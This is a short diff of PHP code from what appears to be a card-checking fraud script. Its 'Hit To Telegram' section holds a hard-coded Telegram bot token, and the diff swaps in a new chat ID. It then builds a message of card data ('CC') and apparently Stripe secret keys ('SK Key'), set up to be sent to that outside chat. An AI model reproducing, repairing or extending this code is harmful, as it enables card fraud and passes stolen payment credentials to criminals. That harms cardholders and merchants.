@@ -133,7 +133,7 @@ break;
 // ---------------------------------------------------- Hit To Telegram Start----------------------------
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
 $botToken = urlencode('6366773556:AAEq6i4JDHVhGOD3W9__qI8dSg3Pl_kXKT4');
-$chatID = urlencode('-990983895');
+$chatID = urlencode('-1001850452581');
 
 $charged_message = "CC:$lista\r\n➤ SK Key:$sk\r\n";
 
